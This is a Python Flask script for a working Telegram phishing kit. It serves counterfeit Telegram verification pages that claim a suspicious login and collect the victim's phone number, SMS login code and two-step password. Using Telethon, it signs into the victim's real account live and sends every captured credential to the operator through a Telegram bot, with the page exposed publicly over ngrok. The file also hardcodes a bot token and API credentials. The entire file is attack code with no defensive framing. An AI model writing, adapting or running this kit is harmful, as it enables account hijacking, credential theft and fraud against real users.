from flask import Flask, request
from pyngrok import ngrok
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import requests, asyncio, threading

# === config ===
api_id = 2040
api_hash = "b18441a1ff607e10a989891a5462e627"
BOT_TOKEN = "8497968985:AAFcPPPmvbYj6atitLNrgOt9eTnhIgoUmhk"
YOUR_CHAT_ID = 8081648911

# === alerter (raw, no library, no crash) ===
def notify(msg):
    print(f"[ALERT] {msg}")
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": YOUR_CHAT_ID, "text": msg},
            timeout=10
        )
    except Exception as e:
        print(f"alerter fail: {e}")

# === async runner (works from sync flask) ===
_async_loop = asyncio.new_event_loop()
def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, _async_loop).result()

def start_loop():
    asyncio.set_event_loop(_async_loop)
    _async_loop.run_forever()

threading.Thread(target=start_loop, daemon=True).start()

# === state ===
phone = None
client = None

app = Flask(__name__)

# === pages ===
PAGE_HOME = '''
<html><body style="background:#0e1621;color:white;font-family:Arial;text-align:center;padding:80px">
<h1 style="color:#2481cc;font-size:48px">Telegram</h1>
<p style="color:#7f8a96">Suspicious login attempt detected</p>
<p style="color:#7f8a96">Verify your account to keep it active</p>
<form method="post" action="/phone" style="margin-top:40px">
    <input name="phone" placeholder="+1 234 567 8900"
           style="padding:14px;width:280px;font-size:16px;background:#17212b;
                  border:1px solid #2b5278;color:white;border-radius:8px">
    <br><br>
    <button style="padding:14px 50px;background:#2481cc;color:white;
                   border:none;font-size:16px;border-radius:8px;cursor:pointer">
        Next
    </button>
</form>
</body></html>
'''

PAGE_CODE = '''
<html><body style="background:#0e1621;color:white;font-family:Arial;text-align:center;padding:80px">
<h2 style="color:white">We sent you a code</h2>
<p style="color:#7f8a96">Enter the 5-digit code from your SMS</p>
<form method="post" action="/code" style="margin-top:40px">
    <input name="code" placeholder="12345" maxlength="6"
           style="padding:14px;width:280px;font-size:20px;background:#17212b;
                  border:1px solid #2b5278;color:white;border-radius:8px;
                  text-align:center;letter-spacing:8px">
    <br><br>
    <button style="padding:14px 50px;background:#2481cc;color:white;
                   border:none;font-size:16px;border-radius:8px;cursor:pointer">
        Verify
    </button>
</form>
</body></html>
'''

PAGE_2FA = '''
<html><body style="background:#0e1621;color:white;font-family:Arial;text-align:center;padding:80px">
<h2 style="color:white">Two-Step Verification</h2>
<p style="color:#7f8a96">Enter your cloud password</p>
<form method="post" action="/2fa" style="margin-top:40px">
    <input name="pw" type="password" placeholder="Password"
           style="padding:14px;width:280px;font-size:16px;background:#17212b;
                  border:1px solid #2b5278;color:white;border-radius:8px">
    <br><br>
    <button style="padding:14px 50px;background:#2481cc;color:white;
                   border:none;font-size:16px;border-radius:8px;cursor:pointer">
        Confirm
    </button>
</form>
</body></html>
'''

PAGE_OK = '<h1 style="color:#2481cc;text-align:center;margin-top:200px">✓ Account verified</h1>'
PAGE_ERR = '<h1 style="color:red;text-align:center;margin-top:200px">Error: {}</h1>'

# === routes ===
@app.route('/')
def home():
    notify(f"👀 VISIT\n\nIP: {request.remote_addr}")
    return PAGE_HOME

@app.route('/phone', methods=['POST'])
def get_phone():
    global phone, client
    raw = request.form['phone']
    phone = ''.join(c for c in raw if c.isdigit() or c == '+')
    if not phone.startswith('+'):
        phone = '+' + phone
    
    notify(f"📞 PHONE CAPTURED\n\nPhone: {phone}\nIP: {request.remote_addr}")
    
    async def do():
        global client
        client = TelegramClient('v', api_id, api_hash)
        await client.connect()
        await client.send_code_request(phone)
    
    try:
        run_async(do())
        return PAGE_CODE
    except Exception as e:
        err = str(e)[:200]
        notify(f"❌ SEND CODE FAILED\n\nPhone: {phone}\nError: {err}")
        return PAGE_ERR.format(err)

@app.route('/code', methods=['POST'])
def get_code():
    code = request.form['code']
    notify(f"🔑 CODE CAPTURED\n\nPhone: {phone}\nCode: {code}")
    
    async def do():
        try:
            await client.sign_in(phone, code)
            return 'ok'
        except SessionPasswordNeededError:
            return '2fa'
    
    try:
        result = run_async(do())
    except Exception as e:
        err = str(e)[:200]
        notify(f"❌ SIGN IN FAILED\n\nPhone: {phone}\nCode: {code}\nError: {err}")
        return PAGE_ERR.format(err)
    
    if result == 'ok':
        async def post():
            try:
                await client.send_message('me', '✓ session hijacked')
            except: pass
        try:
            run_async(post())
        except: pass
        notify(f"✅ LOGGED IN\n\nPhone: {phone}\nCode: {code}\nStatus: OWNED")
        return PAGE_OK
    
    notify(f"⚠️ 2FA NEEDED\n\nPhone: {phone}")
    return PAGE_2FA

@app.route('/2fa', methods=['POST'])
def get_2fa():
    pw = request.form['pw']
    notify(f"🔐 2FA PASSWORD\n\nPhone: {phone}\nPassword: {pw}")
    
    async def do():
        await client.sign_in(password=pw)
        try:
            await client.send_message('me', '✓ session hijacked')
        except: pass
    
    try:
        run_async(do())
        notify(f"✅ FULLY OWNED\n\nPhone: {phone}\nStatus: COMPLETE")
    except Exception as e:
        notify(f"❌ 2FA FAILED\n\nError: {str(e)[:200]}")
    
    return PAGE_OK

# === main ===
if __name__ == '__main__':
    url = ngrok.connect(5000)
    notify(f"🚀 PHISH LIVE\n\nURL: {url}")
    print(f'\n========================================')
    print(f'PHISH URL: {url}')
    print(f'========================================\n')
    app.run(port=5000)